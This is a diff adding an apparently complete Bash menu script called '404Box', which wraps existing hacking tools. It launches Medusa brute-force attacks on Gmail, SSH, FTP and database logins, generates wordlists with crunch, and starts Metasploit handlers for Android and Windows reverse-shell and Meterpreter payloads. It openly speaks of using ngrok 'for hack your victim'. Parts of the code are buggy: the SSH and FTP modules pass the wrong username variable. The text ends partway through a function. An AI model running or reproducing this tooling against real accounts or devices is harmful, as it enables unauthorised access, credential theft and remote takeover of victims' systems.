@@ -1,0 +1,1474 @@
+#!/bin/bash
+
+source $HOME/404Box/config
+
+choose_module() {
+
+clear && toilet -F border 404Box && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+read -p "Do you need to use it on termux or pc [T/p]:> " os
+
+if [ $os == "T" ] || [ $os == "t" ] || [ $os == "termux" ] || [ $os == "Termux" ] || [ $os == "TERMUX" ]; then
+
+if [ -d "~/404Box/output" ]; then
+
+main_module_t
+
+else
+
+mkdir output && main_module_t
+
+fi
+
+elif [ $os == "PC" ] || [ $os == "pc" ] || [ $os == "Pc" ] || [ $os == "p" ] || [ $os == "P" ]; then
+
+
+if [ -d "~/404Box/output" ]; then
+
+main_module
+
+else
+
+mkdir output && main_module
+
+fi
+
+else
+
+exit
+
+fi
+
+}
+
+back_module() {
+
+echo -e $cyan
+
+read -p "Do you need to back to main menu? [Y/n]:> " back
+
+if [ $back == "Y" ] || [ $back == "y" ]; then
+
+main_module
+
+elif [ $back == "N" ] || [ $back == "n" ]; then
+
+clear && echo -e $green"[${red}<3$green] ${cyan}Happy Hacking Day :D\n" && exit
+
+else
+
+echo -e $green"\n[${red}!$green] ${red}Command Invalid...\n" && sleep 0.5 && back_module
+
+fi
+
+}
+
+main_module() {
+
+clear && toilet -F border 404Box | lolcat && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e "$success ${cyan}404Box Main Menu $success\n"
+echo -e $green"[${red}1$green] ${red}IPGeolocation Menu"
+echo -e $green"[${red}2$green] ${red}Bruteforce Menu"
+echo -e $green"[${red}3$green] ${red}Metasploit Menu"
+echo -e $green"[${red}4$green] ${red}Wordlist Generate"
+echo -e $green"[${red}5$green] ${red}Github loader"
+echo -e $green"[${red}6$green] ${red}ErrorSQLi"
+echo -e $green"[${red}7$green] ${red}Credits"
+echo -e $green"[${red}99$green] ${red}Exit\n${green}"
+
+read -p "Dooper:> " opt
+
+if [ $opt == "1" ]; then 
+
+geo_module
+
+elif [ $opt == "2" ]; then 
+
+brute_module
+
+elif [ $opt == "3" ]; then 
+
+metasploit
+
+elif [ $opt == "4" ]; then 
+
+wgen_module
+
+elif [ $opt == "5" ]; then 
+
+git_module
+
+elif [ $opt == "6" ]; then
+
+sql_module
+
+elif [ $opt == "7" ]; then
+
+echo -e $red"\n:: ${cyan} Credits $red::\n"
+
+echo -e $red"JoMo-Kun / Foofus Networks $green[${red}Medusa Tools$green]"
+echo -e $red"Rapid7 $green[${red}Metasploit$green]"
+echo -e $red"Openwall $green[${red}JohnTheRipper$green]\n" 
+
+back_module
+
+elif [ $opt == "99" ]; then 
+
+clear && exit
+
+else
+
+main_module
+
+fi
+
+}
+
+main_module_t() {
+
+clear && toilet -F border 404Box && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e "$success ${cyan}404Box Main Menu $success\n"
+echo -e $green"[${red}1$green] ${red}IPGeolocation Menu"
+echo -e $green"[${red}2$green] ${red}Bruteforce Menu"
+echo -e $green"[${red}3$green] ${red}Metasploit Menu"
+echo -e $green"[${red}4$green] ${red}Wordlist Generate"
+echo -e $green"[${red}5$green] ${red}Github loader"
+echo -e $green"[${red}6$green] ${red}ErrorSQLi"
+echo -e $green"[${red}7$green] ${red}Credits"
+echo -e $green"[${red}99$green] ${red}Exit\n${green}"
+
+read -p "Dooper:> " opt
+
+if [ $opt == "1" ]; then 
+
+geo_module_t
+
+elif [ $opt == "2" ]; then 
+
+brute_module_t
+
+elif [ $opt == "3" ]; then 
+
+metasploit_t
+
+elif [ $opt == "4" ]; then 
+
+wgen_module_t
+
+elif [ $opt == "5" ]; then 
+
+git_module_t
+
+elif [ $opt == "6" ]; then
+
+sql_module_t
+
+elif [ $opt == "7" ]; then
+
+echo -e $red"\n:: ${cyan} Credits $red::\n"
+
+echo -e $red"JoMo-Kun / Foofus Networks $green[${red}Medusa Tools$green]"
+echo -e $red"Rapid7 $green[${red}Metasploit$green]"
+echo -e $red"Openwall $green[${red}JohnTheRipper$green]\n" 
+
+back_module
+
+elif [ $opt == "99" ]; then 
+
+clear && exit
+
+else
+
+main_module_t
+
+fi
+
+}
+
+geo_module() {
+
+clear && toilet -F border IP GEO | lolcat && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $yellow"[$green+$yellow] ${cyan}IPGeolocation Menu $yellow[$green+$yellow]\n"
+echo -e $green"[${red}1${green}] ${cyan}Track yourself"
+echo -e $green"[${red}2${green}] ${cyan}Track ip from someone"
+echo -e $green"[${red}99${green}] ${cyan}Back\n"
+
+read -p "IPGeolocation:> " geo
+
+if [ $geo == "1" ]; then
+
+geo_self
+
+elif [ $geo == "2" ]; then
+
+geo_other
+
+elif [ $geo == "99" ]; then
+
+main_module
+
+else
+
+echo -e $red"[!]Command invalid...\n" && sleep 1 && geo_module
+
+fi
+
+}
+
+geo_module_t() {
+
+echo -e $green && clear && toilet -F border IP GEO && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $yellow"[$green+$yellow] ${cyan}IPGeolocation Menu $yellow[$green+$yellow]\n"
+echo -e $green"[${red}1${green}] ${cyan}Track yourself"
+echo -e $green"[${red}2${green}] ${cyan}Track ip from someone"
+echo -e $green"[${red}99${green}] ${cyan}Back\n"
+
+read -p "IPGeolocation:> " geo
+
+if [ $geo == "1" ]; then
+
+geo_self_t
+
+elif [ $geo == "2" ]; then
+
+geo_other_t
+
+elif [ $geo == "99" ]; then
+
+main_module_t
+
+else
+
+echo -e $red"[!]Command invalid...\n" && sleep 1 && geo_module_t
+
+fi
+
+}
+
+geo_self() {
+
+clear && toilet -F border IP GEO | lolcat && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $cyan${blink}"\nJust a moment... just a few minute\n${reset}"
+
+geo="curl -s https://ipapi.co/$pubip/json/"
+
+ip=`( $geo | jq '.ip' )`
+city=`( $geo | jq '.city')`
+region=`( $geo | jq '.country_name')`
+country_code=`( $geo | jq '.country_code' )`
+zipcode=`( $geo | jq '.postal')`
+latitude=`( $geo | jq '.latitude')`
+longitude=`( $geo | jq '.longitude')`
+currency=`( $geo | jq '.currency')`
+timezone=`( $geo | jq '.timezone')`
+calling_code=`( $geo | jq '.country_calling_code')`
+isp=`( $geo | jq '.org')`
+
+echo -e $cyan":: ${yellow}Your Information $cyan::\n"
+
+echo -e $green"[$red+$green]$yellow IP : ${green}$ip"
+echo -e $green"[$red+$green]$yellow Country : ${green}$region || $country_code"
+echo -e $green"[$red+$green]$yellow City : ${green}$city"
+echo -e $green"[$red+$green]$yellow Currency : ${green}$currency"
+echo -e $green"[$red+$green]$yellow Calling Code : ${green}$calling_code"
+echo -e $green"[$red+$green]$yellow Zip Code: ${green}$zipcode"
+echo -e $green"[$red+$green]$yellow Latitude : ${green}$latitude"
+echo -e $green"[$red+$green]$yellow Longitude : ${green}$longitude"
+echo -e $green"[$red+$green]$yellow Timezone : ${green}$timezone"
+echo -e $green"[$red+$green]$yellow ISP : ${green}$isp"
+
+echo && back_module
+
+}
+
+geo_self_t() {
+
+echo -e $green && clear && toilet -F border IP GEO && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $cyan${blink}"\nJust a moment... just a few minute\n${reset}"
+
+geo="curl -s https://ipapi.co/$pubip/json/"
+
+ip=`( $geo | jq '.ip' )`
+city=`( $geo | jq '.city')`
+region=`( $geo | jq '.country_name')`
+country_code=`( $geo | jq '.country_code' )`
+zipcode=`( $geo | jq '.postal')`
+latitude=`( $geo | jq '.latitude')`
+longitude=`( $geo | jq '.longitude')`
+currency=`( $geo | jq '.currency')`
+timezone=`( $geo | jq '.timezone')`
+calling_code=`( $geo | jq '.country_calling_code')`
+isp=`( $geo | jq '.org')`
+
+echo -e $cyan":: ${yellow}Your Information $cyan::\n"
+
+echo -e $green"[$red+$green]$yellow IP : ${green}$ip"
+echo -e $green"[$red+$green]$yellow Country : ${green}$region || $country_code"
+echo -e $green"[$red+$green]$yellow City : ${green}$city"
+echo -e $green"[$red+$green]$yellow Currency : ${green}$currency"
+echo -e $green"[$red+$green]$yellow Calling Code : ${green}$calling_code"
+echo -e $green"[$red+$green]$yellow Zip Code: ${green}$zipcode"
+echo -e $green"[$red+$green]$yellow Latitude : ${green}$latitude"
+echo -e $green"[$red+$green]$yellow Longitude : ${green}$longitude"
+echo -e $green"[$red+$green]$yellow Timezone : ${green}$timezone"
+echo -e $green"[$red+$green]$yellow ISP : ${green}$isp"
+
+echo && back_module
+
+}
+
+metasploit() {
+
+clear && toilet -F border META | lolcat
+
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e "$success ${red}Victim's OS $success\n"
+echo -e $green"[${red}A${green}] ${cyan}Android"
+echo -e $green"[${red}W${green}] ${cyan}Windows"
+echo -e $green"[${red}B${green}] ${cyan}Back\n"
+
+read -p "Victim's OS:> " mopt
+
+if [ $mopt == "A" ] || [ $mopt == "a" ] || [ $mopt == "android" ] || [ $mopt == "Android" ]; then
+
+android_pay
+
+read -p "PAYLOAD:> " payload
+sleep 0.5
+
+echo -e $yellow"This module support ngrok. you can use ngrok for hack your victim."
+echo -e $cyan"Your local ip: ${green}$lip\n"
+read -p "LHOST:> " lhost
+sleep 0.5
+read -p "LPORT:> " lport
+sleep 0.5
+
+echo -e "$success ${cyan} Your information $success\n"
+echo -e $green"#=============================================#"
+echo -e "$success ${cyan}Victim's OS : $mopt"
+echo -e "$success ${cyan}Payload : $payload"
+echo -e "$success ${cyan}LHOST : $lhost"
+echo -e "$success ${cyan}LPORT : $lport"
+echo -e $green"#=============================================#\n"
+
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module
+
+elif [ $mopt == "W" ] || [ $mopt == "w" ] || [ $mopt == "windows" ] || [ $mopt == "Windows" ]; then
+
+windows_pay
+
+read -p "PAYLOAD:> " payload
+sleep 0.5
+echo -e $yellow"This module support ngrok. you can use ngrok for hack your victim.\n"
+echo -e $cyan"Your local ip: ${green}$lip\n"
+read -p "LHOST:> " lhost
+sleep 0.5
+read -p "LPORT:> " lport
+sleep 0.5
+read -p "ReverseListener:> " reverse
+sleep 0.5
+
+if [ $reverse == "y" ] || [ $reverse == "Y" ]; then
+
+echo -e "$success ${cyan} Your information $success\n"
+echo -e $green"#=============================================#"
+echo -e "$success ${cyan}Victim's OS : $mopt"
+echo -e "$success ${cyan}Payload : $payload"
+echo -e "$success ${cyan}LHOST : $lhost"
+echo -e "$success ${cyan}LPORT : $lport"
+echo -e "$success ${cyan}ReverseListerner : $reverse"
+echo -e $green"#=============================================#\n"
+
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; set ReverseListernerBindAddress 127.0.0.1; clear; exploit -z; exit;" && back_module
+
+elif [ $reverse == "n" ] || [ $reverse == "N" ]; then
+
+echo -e "$success ${cyan} Your information $success\n"
+echo -e $green"#=============================================#"
+echo -e "$success ${cyan}Victim's OS : $mopt"
+echo -e "$success ${cyan}Payload : $payload"
+echo -e "$success ${cyan}LHOST : $lhost"
+echo -e "$success ${cyan}LPORT : $lport"
+echo -e "$success ${cyan}ReverseListerner : $reverse"
+echo -e $green"#=============================================#\n"
+
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module
+
+else
+
+sleep 1 && metasploit
+
+fi
+
+elif [ $mopt == "B" ] || [ $mopt == "b" ] || [ $mopt == "back" ] || [ $mopt == "Back" ]; then
+
+main_module
+
+else
+
+metasploit
+
+fi
+
+}
+
+android_pay() {
+
+clear && toilet -F border ANDROID | lolcat
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $cyan":: ${green}Android payload list ${cyan}::\n"
+
+echo -e $red"- android/meterpreter/reverse_tcp"
+echo -e $red"- android/meterpreter/reverse_http"
+echo -e $red"- android/meterpreter/reverse_https\n"
+echo -e $red"- android/shell/reverse_http"
+echo -e $red"- android/shell/reverse_https"
+echo -e $red"- android/shell/reverse_tcp\n$green"
+
+}
+
+android_pay_t() {
+
+echo -e $green && clear && toilet -F border ANDROID
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $cyan":: ${green}Android payload list ${cyan}::\n"
+
+echo -e $red"- android/meterpreter/reverse_tcp"
+echo -e $red"- android/meterpreter/reverse_http"
+echo -e $red"- android/meterpreter/reverse_https\n"
+echo -e $red"- android/shell/reverse_http"
+echo -e $red"- android/shell/reverse_https"
+echo -e $red"- android/shell/reverse_tcp\n$green"
+
+}
+
+windows_pay_t() {
+
+echo -e $green && clear && toilet -F border WINDOWS
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $cyan":: ${green}Windows payload list ${cyan}::\n"
+
+echo -e $cyan":: ${green}Payload x86 List ${cyan}::\n"
+echo -e $red"- windows/meterpreter/reverse_tcp"
+echo -e $red"- windows/meterpreter/reverse_http"
+echo -e $red"- windows/meterpreter/reverse_https\n"
+
+echo -e $red"- windows/shell/reverse_http"
+echo -e $red"- windows/shell/reverse_https"
+echo -e $red"- windows/shell/reverse_tcp\n"
+
+echo -e $cyan":: ${green}Payload x64 List ${cyan}::\n"
+echo -e $red"- windows/x64/meterpreter/reverse_tcp"
+echo -e $red"- windows/x64/meterpreter/reverse_http"
+echo -e $red"- windows/x64/meterpreter/reverse_https\n"
+
+echo -e $red"- windows/x64/shell/reverse_http"
+echo -e $red"- windows/x64/shell/reverse_https"
+echo -e $red"- windows/x64/shell/reverse_tcp\n"
+
+echo -e $cyan":: ${green}VNC Payload List ${cyan}::\n"
+echo -e $red"- windows/x64/vncinject/reverse_http"
+echo -e $red"- windows/x64/vncinject/reverse_https\n"
+
+}
+
+windows_pay() {
+
+clear && toilet -F border WINDOWS | lolcat && echo
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e $cyan":: ${green}Windows payload list ${cyan}::\n"
+
+echo -e $cyan":: ${green}Payload x86 List ${cyan}::\n"
+echo -e $red"- windows/meterpreter/reverse_tcp"
+echo -e $red"- windows/meterpreter/reverse_http"
+echo -e $red"- windows/meterpreter/reverse_https\n"
+
+echo -e $red"- windows/shell/reverse_http"
+echo -e $red"- windows/shell/reverse_https"
+echo -e $red"- windows/shell/reverse_tcp\n"
+
+echo -e $cyan":: ${green}Payload x64 List ${cyan}::\n"
+echo -e $red"- windows/x64/meterpreter/reverse_tcp"
+echo -e $red"- windows/x64/meterpreter/reverse_http"
+echo -e $red"- windows/x64/meterpreter/reverse_https\n"
+
+echo -e $red"- windows/x64/shell/reverse_http"
+echo -e $red"- windows/x64/shell/reverse_https"
+echo -e $red"- windows/x64/shell/reverse_tcp\n"
+
+echo -e $cyan":: ${green}VNC Payload List ${cyan}::\n"
+echo -e $red"- windows/x64/vncinject/reverse_http"
+echo -e $red"- windows/x64/vncinject/reverse_https\n"
+
+}
+
+metasploit_t() {
+
+echo -e $green && clear && toilet -F border META
+echo -e $cyan"Create By: $author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube: $yt\n$green"
+
+echo -e "$success ${red}Victim's OS $success\n"
+echo -e $green"[${red}A${green}] ${cyan}Android"
+echo -e $green"[${red}W${green}] ${cyan}Windows"
+echo -e $green"[${red}B${green}] ${cyan}Back\n"
+
+read -p "Victim's OS:> " mopt
+
+if [ $mopt == "A" ] || [ $mopt == "a" ] || [ $mopt == "android" ] || [ $mopt == "Android" ]; then
+
+android_pay_t
+
+read -p "PAYLOAD:> " payload
+sleep 0.5
+
+echo -e $yellow"This module support ngrok. you can use ngrok for hack your victim."
+echo -e $cyan"Your local ip: ${green}$lip\n"
+read -p "LHOST:> " lhost
+sleep 0.5
+read -p "LPORT:> " lport
+sleep 0.5
+
+echo -e "$success ${cyan} Your information $success\n"
+echo -e $green"#=============================================#"
+echo -e "$success ${cyan}Victim's OS : $mopt"
+echo -e "$success ${cyan}Payload : $payload"
+echo -e "$success ${cyan}LHOST : $lhost"
+echo -e "$success ${cyan}LPORT : $lport"
+echo -e $green"#=============================================#\n"
+
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module
+
+elif [ $mopt == "W" ] || [ $mopt == "w" ] || [ $mopt == "windows" ] || [ $mopt == "Windows" ]; then
+
+windows_pay_t
+
+read -p "PAYLOAD:> " payload
+sleep 0.5
+echo -e $yellow"This module support ngrok. you can use ngrok for hack your victim.\n"
+echo -e $cyan"Your local ip: ${green}$lip\n"
+read -p "LHOST:> " lhost
+sleep 0.5
+read -p "LPORT:> " lport
+sleep 0.5
+read -p "ReverseListener:> " reverse
+sleep 0.5
+
+if [ $reverse == "y" ] || [ $reverse == "Y" ]; then
+
+echo -e "$success ${cyan} Your information $success\n"
+echo -e $green"#=============================================#"
+echo -e "$success ${cyan}Victim's OS : $mopt"
+echo -e "$success ${cyan}Payload : $payload"
+echo -e "$success ${cyan}LHOST : $lhost"
+echo -e "$success ${cyan}LPORT : $lport"
+echo -e "$success ${cyan}ReverseListerner : $reverse"
+echo -e $green"#=============================================#\n"
+
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; set ReverseListernerBindAddress 127.0.0.1; clear; exploit -z; exit;" && back_module
+
+elif [ $reverse == "n" ] || [ $reverse == "N" ]; then
+
+echo -e "$success ${cyan} Your information $success\n"
+echo -e $green"#=============================================#"
+echo -e "$success ${cyan}Victim's OS : $mopt"
+echo -e "$success ${cyan}Payload : $payload"
+echo -e "$success ${cyan}LHOST : $lhost"
+echo -e "$success ${cyan}LPORT : $lport"
+echo -e "$success ${cyan}ReverseListerner : $reverse"
+echo -e $green"#=============================================#\n"
+
+msfconsole -x "use exploit/multi/handler; set payload $payload; set lhost $lhost; set lport $lport; clear; exploit -z; exit;" && back_module
+
+else
+
+sleep 1 && metasploit_t
+
+fi
+
+elif [ $mopt == "B" ] || [ $mopt == "b" ] || [ $mopt == "back" ] || [ $mopt == "Back" ]; then
+
+main_module_t
+
+else
+
+metasploit_t
+
+fi
+
+}
+
+brute_module() 
+{
+
+echo -e $green && clear && toilet -F border BRUTE | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e "${alert} ${cyan}Brute force Menu ${alert}\n"
+echo -e "[${red}1${green}] ${cyan}Gmail Bruteforce"
+echo -e ${green}"[${red}2${green}] ${cyan}SSH Bruteforce"
+echo -e ${green}"[${red}3${green}] ${cyan}FTP Bruteforce"
+echo -e ${green}"[${red}4${green}] ${cyan}MYSQL Bruteforce"
+echo -e ${green}"[${red}5${green}] ${cyan}MSSQL Bruteforce"
+echo -e ${green}"[${red}6${green}] ${cyan}ZIP Bruteforce"
+echo -e ${green}"[${red}7${green}] ${cyan}RAR Bruteforce"
+echo -e ${green}"[${red}99${green}] ${cyan}Back\n"
+
+read -p "Brute Force:> " opt
+
+if [ $opt == "1" ]; then
+
+gmail_module
+
+elif [ $opt == "2" ]; then
+
+ssh_module
+
+elif [ $opt == "3" ]; then
+
+ftp_module
+
+elif [ $opt == "4" ]; then
+
+mysql_module
+
+elif [ $opt == "5" ]; then
+
+mssql_module
+
+elif [ $opt == "6" ]; then
+
+zip_module
+
+elif [ $opt == "7" ]; then
+
+rar_module
+
+elif [ $opt == "99" ]; then
+
+main_module
+
+else
+
+brute_module
+
+fi
+
+}
+
+ssh_module()
+
+{
+
+echo -e $green && clear && toilet -F border SSH | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success"${cyan}Target IP = ${green}$ip"
+echo -e $success"${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M ssh -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && ssh_module
+
+else
+
+sleep 0.5 && ssh_module
+
+fi
+
+}
+
+git_module() {
+
+clear && toilet -F border LOADER | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github : $gh"
+echo -e $red"Youtube : ${yt}${green}"
+
+read -p "Github Author:> " author
+sleep 0.5
+echo -e $cyan
+read -p "Repository:> " repo
+sleep 0.5
+echo -e $red
+read -p "Output:> " output
+sleep 0.5
+echo -e $cyan
+
+cd /root/404Box && mkdir modules && git clone https://github.com/$author/$repo /$HOME/404Box/modules/$output
+
+sleep 0.5 && back_module
+
+}
+
+git_module_t() {
+
+echo -e $green && clear && toilet -F border LOADER
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github : $gh"
+echo -e $red"Youtube : ${yt}$green"
+
+read -p "Github Author:> " author
+sleep 0.5
+echo -e $cyan
+read -p "Repository:> " repo
+sleep 0.5
+echo -e $red
+read -p "Output:> " output
+sleep 0.5
+echo -e $cyan
+
+cd /root/404Box && mkdir modules && git clone https://github.com/$author/$repo /$HOME/404Box/modules/$output
+
+sleep 0.5 && back_module
+
+}
+
+wgen_module() {
+clear && toilet -F border WGen | lolcat
+
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+lower="abcdefghijklmnopqrstuvwxyz"
+number="0123456789"
+sym="!@$_-+"
+mix="${upper}${lower}${number}${sym}"
+
+read -p "Min Lenght:> " min
+sleep 0.5
+
+read -p "Max Lenght:> " max
+sleep 0.5
+
+read -p "Charset:> " char
+sleep 0.5
+
+read -p "Output:> " output
+sleep 0.5
+
+if [ $char == "upper" ] || [ $char == "Upper" ]; then
+
+echo -e $green && clear && crunch $min $max $upper -o $output && clear
+
+elif [ $char == "lower" ] || [ $char == "lower" ]; then
+
+echo -e $green && clear && crunch $min $max $lower -o $output && clear
+
+elif [ $char == "number" ] || [ $char == "Number" ]; then
+
+echo -e $green && clear && crunch $min $max $number -o $output && clear
+
+elif [ $char == "sym" ] || [ $char == "Sym" ] || [ $char == "symbols" ] || [ $char == "Symbols" ]; then
+
+echo -e $green && clear && crunch $min $max $sym -o $output && clear
+
+elif [ $char == "mix" ] || [ $char == "Mix" ]; then
+
+echo -e $green && clear && crunch $min $max $mix -o $output && clear
+
+else
+
+echo -e $green && clear && crunch $min $max $char -o $output && clear
+
+fi
+
+}
+
+wgen_module_t() {
+echo -e $green && clear && toilet -F border WGen
+
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+lower="abcdefghijklmnopqrstuvwxyz"
+number="0123456789"
+sym="!@$_-+"
+mix="${upper}${lower}${number}${sym}"
+
+read -p "Min Lenght:> " min
+sleep 0.5
+
+read -p "Max Lenght:> " max
+sleep 0.5
+
+read -p "Charset:> " char
+sleep 0.5
+
+read -p "Output:> " output
+sleep 0.5
+
+if [ $char == "upper" ] || [ $char == "Upper" ]; then
+
+echo -e $green && clear && crunch $min $max $upper -o $output && clear
+
+elif [ $char == "lower" ] || [ $char == "lower" ]; then
+
+echo -e $green && clear && crunch $min $max $lower -o $output && clear
+
+elif [ $char == "number" ] || [ $char == "Number" ]; then
+
+echo -e $green && clear && crunch $min $max $number -o $output && clear
+
+elif [ $char == "sym" ] || [ $char == "Sym" ] || [ $char == "symbols" ] || [ $char == "Symbols" ]; then
+
+echo -e $green && clear && crunch $min $max $sym -o $output && clear
+
+elif [ $char == "mix" ] || [ $char == "Mix" ]; then
+
+echo -e $green && clear && crunch $min $max $mix -o $output && clear
+
+else
+
+echo -e $green && clear && crunch $min $max $char -o $output && clear
+
+fi
+
+}
+
+gmail_module()
+
+{
+echo -e $green && clear && toilet -F border GMAIL | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target Email:> " email
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success"${cyan}Email = ${green}$email"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h 74.125.200.109 -u $email -P $path -M smtp -F -b | grep -E "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && gmail_module
+
+else
+
+sleep 0.5 && gmail_module
+
+fi
+
+}
+
+gmail_module_t()
+
+{
+echo -e $green && clear && toilet -F border GMAIL && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target Email:> " email
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success"${cyan}Email = ${green}$email"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h 74.125.200.109 -u $email -P $path -M smtp -F -b | grep -E "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && gmail_module_t
+
+else
+
+sleep 0.5 && gmail_module_t
+
+fi
+
+}
+
+ssh_module_t()
+
+{
+
+echo -e $green && clear && toilet -F border SSH && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success"${cyan}Target IP = ${green}$ip"
+echo -e $success"${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M ssh -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && ssh_module_t
+
+else
+
+sleep 0.5 && ssh_module_t
+
+fi
+
+}
+
+ftp_module()
+
+{
+echo -e $green && clear && toilet -F border FTP | lolcat && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
+echo -e $red"Youtube : ${yt}\n"
+
+echo -e $green
+read -p "Target IP:> " ip
+sleep 0.5
+echo -e $yellow
+read -p "Target Username:> " user
+sleep 0.5
+echo -e $cyan
+read -p "Wordlist Path:> " path
+sleep 0.5
+
+echo -e "\n$alert ${cyan}Information $alert\n"
+echo -e $success" ${cyan}Target IP = ${green}$ip"
+echo -e $success" ${cyan}Username = ${green}$user"
+echo -e $success"${cyan}Wordlist Path = ${green}$path\n${yellow}"
+
+read -p "Is your information correct? [Y/n]:> " correct
+
+if [ $correct == "Y" ] || [ $correct == "y" ]; then
+
+medusa -h $ip -u $email -P $path -M ftp -F -b | grep -P "ACCOUNT FOUND"
+
+echo && back_module
+
+elif [ $correct == "N" ] || [ $correct == "n" ]; then
+
+sleep 0.5 && ftp_module
+
+else
+
+sleep 0.5 && ftp_module
+
+fi
+
+}
+
+ftp_module_t()
+
+{
+echo -e $green && clear && toilet -F border FTP && echo
+echo -e $cyan"\nCreate By : ${green}$author${green}"
+echo -e "Github: ${cyan}https://github.com/RetroSec/"
